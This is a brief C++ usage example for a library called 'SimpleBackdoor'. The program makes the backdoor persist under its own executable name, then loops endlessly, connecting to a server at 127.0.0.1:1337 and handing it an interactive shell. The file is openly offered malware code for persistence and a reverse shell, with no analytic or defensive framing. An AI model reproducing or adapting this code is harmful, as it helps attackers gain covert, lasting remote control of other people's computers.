/*
SimpleBackdoor usage example
*/

#include "simplebackdoor.h"

int main(int argc, char **argv)
{
    SimpleBackdoor* door = SimpleBackdoor::getInstance();

    std::string programName(argv[0]);
    programName = programName.substr(programName.find_last_of("\\")+1);
    door->persist(programName);

    while (1) {
        door->connectToServer("127.0.0.1", "1337");
        door->doShell();
    }

    return 0;
}
